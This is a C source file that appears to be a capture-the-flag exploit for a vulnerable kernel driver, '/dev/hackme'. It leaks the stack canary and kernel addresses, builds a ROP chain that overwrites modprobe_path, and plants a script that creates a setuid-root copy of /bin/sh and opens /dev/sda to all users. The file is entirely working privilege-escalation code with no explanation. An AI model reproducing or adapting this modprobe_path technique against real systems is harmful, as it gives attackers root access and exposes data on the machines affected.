#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <errno.h>
#include <fcntl.h>
#include <pty.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#define PHYS_OFF 0xFFFF880000000000
#define PAGE_SIZE 0x1000
#define PFN_MIN 0x0

void hexdump(unsigned char* buf, size_t size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}

void dq(uint64_t* buf, size_t size) {
    size_t i = 0;
    for (; i < size; ++i) {
        printf("%" PRIu64 ": 0x%" PRIx64 "\n", i, buf[i]);
    }
}
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0;
_prepare_kernel_cred prepare_kernel_cred = 0;

char buf[0x1000];

void wait() {
    puts("...");
    getchar();
}
int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    int fd = open("/dev/hackme", O_RDWR);
    if (fd < 0) {
        perror("open");
        goto fail;
    }
    read(fd, buf, 0x180);

    uint64_t *qbuf = (uint64_t*)buf;
    dq(qbuf, 50);

    uint64_t canary = qbuf[2];
    uint64_t ktmp = qbuf[26] - 0x118; // stack
    uint64_t orbp = qbuf[26] - 0x48; // old rbp
    uint64_t modprobe_path = qbuf[41] + 0xe61794;
    printf("modprobe_path: 0x%" PRIx64 "\n", modprobe_path);
    uint64_t stext = qbuf[38] - 0xa157;
    printf("stext : 0x%" PRIx64 "\n", stext);
    uint64_t kmemcpy = stext + 0xdd60;
    uint64_t pop_rdi = stext + 0x6370;
    printf("pop_rdi : 0x%" PRIx64 "\n", pop_rdi);
    uint64_t pop_rdx = stext + 0x7616;
    uint64_t pop_rsi_rbp = stext + 0x423;
    uint64_t pop_rbp = pop_rsi_rbp + 1;
    uint64_t pop_rax = stext + 0x4d11;
    uint64_t pop_rbx = stext + 0x6158;
    uint64_t ret = pop_rax + 1;

    memcpy(buf, "/tmp/xx\x00", 8);
    system("echo -ne '#!/bin/sh\\n/bin/cp /bin/sh /tmp/sh\\n/bin/chmod 4777 /tmp/sh\\n/bin/chmod 777 /dev/sda' > /tmp/xx");
    system("chmod +x /tmp/xx");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/a");
    system("chmod +x /tmp/a");
    //system("cat /tmp/xx");
    //system("xxd /tmp/a");
    uint64_t *rop = &qbuf[20];
    *rop++ = pop_rdi; // 20
    *rop++ = modprobe_path;
    *rop++ = pop_rsi_rbp;
    *rop++ = ktmp;
    *rop++ = qbuf[37]; // some rbp
    *rop++ = pop_rdx;
    *rop++ = 8;
    *rop++ = kmemcpy;
    *rop++ = pop_rax;
    *rop++ = 0x100;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    *rop++ = ret;
    write(fd, buf, 8*41);
    system("/tmp/a");
    system("strings /dev/sda");
    return 0;
fail:
    return 1;
}
